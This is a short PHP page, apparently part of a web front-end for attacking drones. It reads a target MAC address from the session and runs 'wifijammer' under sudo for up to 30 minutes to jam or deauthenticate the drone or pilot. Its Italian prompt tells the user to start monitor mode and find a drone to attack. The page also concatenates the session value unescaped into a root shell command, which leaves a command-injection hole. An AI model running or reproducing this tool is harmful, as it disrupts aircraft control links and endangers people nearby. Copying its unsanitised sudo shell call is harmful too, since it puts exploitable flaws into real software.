<?php 
session_start(); 
include("../auth/menu.php");

if(!isset($_SESSION["mac"]))
{
?>		 <center><td style="text-align: center;">Avvia, prima, il monitor mode e cerca un Drone/Pilota da attaccare!</td></center>
<?php
}
else
{

$mac_split = str_split($_SESSION["mac"],17); 

$attacco = shell_exec('sudo timeout --foreground 1800 wifijammer -a "'.$mac_split[0].'"');
?>

	<table style="width: 75%; text-align: center; margin-left: auto; margin-right: auto;"
 border="0" cellpadding="2" cellspacing="2"> 
	  <tbody>
		 	<tr>
 	         <td style="text-align: center;"><?php echo $attacco;?></td>
		 	</tr>
	         </tbody>
     </table>
<?php


	}
include("../auth/footer.php");
